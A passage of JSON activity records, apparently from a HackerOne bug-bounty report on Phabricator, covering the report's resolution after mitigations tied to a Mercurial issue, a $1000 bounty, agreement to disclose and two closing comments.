code.","automated_response":false,"created_at":"2017-11-09T23:38:13.216Z","updated_at":"2017-11-09T23:38:13.216Z","actor":{"username":"amckinley","cleared":false,"url":"/amckinley","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"phabricator","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2149714,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Mercurial plans to mitigate this in a future release several weeks from now, so we've landed our mitigations immediately.\n\nSee \u003chttps://secure.phabricator.com/T13012\u003e for details. (That task will be updated with more information shortly.)","automated_response":false,"created_at":"2017-11-10T16:48:28.468Z","updated_at":"2017-11-10T16:48:28.468Z","actor":{"username":"epriestley","cleared":false,"url":"/epriestley","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/043/3ebca5250ea5abd54b49ccc9d69c636af4585b2e_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"pnig0s","url":"/pnig0s"},"genius_execution_id":null,"team_handle":"phabricator","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2149715,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","automated_response":false,"created_at":"2017-11-10T16:49:37.804Z","updated_at":"2017-11-10T16:49:37.804Z","actor":{"url":"/phabricator","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/018/61446f7e6f0684c8c9f7c36c918b7ecd58183588_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Phabricator"}},"bounty_amount":"1000.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"phabricator","collaborator":{"username":"pnig0s","url":"/pnig0s"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2149716,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Details are publicly available, so this can be disclosed at any time.","automated_response":false,"created_at":"2017-11-10T16:49:58.568Z","updated_at":"2017-11-10T16:49:58.568Z","first_to_agree":true,"actor":{"username":"epriestley","cleared":false,"url":"/epriestley","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/043/3ebca5250ea5abd54b49ccc9d69c636af4585b2e_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"phabricator","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2150634,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Ok let's make it go public.","automated_response":false,"created_at":"2017-11-11T00:42:44.014Z","updated_at":"2017-11-11T00:42:44.014Z","actor":{"username":"pnig0s","cleared":true,"url":"/pnig0s","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/004/213/e112ceef38cf6dd1b3bad43caa88880a151ec75f_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"phabricator","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2150635,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2017-11-11T00:42:44.170Z","updated_at":"2017-11-11T00:42:44.170Z","actor":{"username":"pnig0s","cleared":true,"url":"/pnig0s","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/004/213/e112ceef38cf6dd1b3bad43caa88880a151ec75f_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"phabricator","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2150655,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"BTW:How can i track the details of the mitigation from mercurial side?","automated_response":false,"created_at":"2017-11-11T00:48:34.565Z","updated_at":"2017-11-11T00:48:34.565Z","actor":{"username":"pnig0s","cleared":true,"url":"/pnig0s","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/004/213/e112ceef38cf6dd1b3bad43caa88880a151ec75f_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"phabricator","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2151534,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I'm not sure, I don't have any more information than what I posted in \u003chttps://secure.phabricator.com/T13012\u003e.","automated_response":false,"created_at":"2017-11-11T17:26:41.538Z","updated_at":"2017-11-11T17:26:41.538Z","actor":{"username":"epriestley","cleared":false,"url":"/epriestley","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/043/3ebca5250ea5abd54b49ccc9d69c636af4585b2e_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"phabricator","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}